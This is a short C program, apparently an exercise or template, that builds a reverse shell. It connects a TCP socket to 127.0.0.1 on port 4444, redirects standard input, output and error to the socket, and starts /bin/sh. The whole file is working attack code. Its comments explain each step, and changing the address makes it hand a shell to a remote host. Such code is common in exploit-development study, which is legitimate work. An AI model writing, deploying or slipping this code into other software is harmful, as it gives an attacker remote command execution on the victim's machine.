#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

int main(){
	//Create a socket check man 2 socket for reference
	int host_sock = socket(AF_INET, SOCK_STREAM, 0);
	// creating a sockaddr structure
	struct sockaddr_in host_addr;
	// AF_INET for IPv4
	host_addr.sin_family = AF_INET;
	// Connecting to port 4444
	host_addr.sin_port = htons(4444);
	// IP to connect is set by inet_addr
	host_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	// connecting to socket
	connect(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));

	// sending and receiving data using STDIN, STDOUT, STDERR
	// STDIN =0 ; STDOUT =1; STDERR=2
	int i;
	for(i=0; i<=2; i++){
		dup2(host_sock, i);
	}
	// executing a shell
	execve("/bin/sh", NULL, NULL);
}
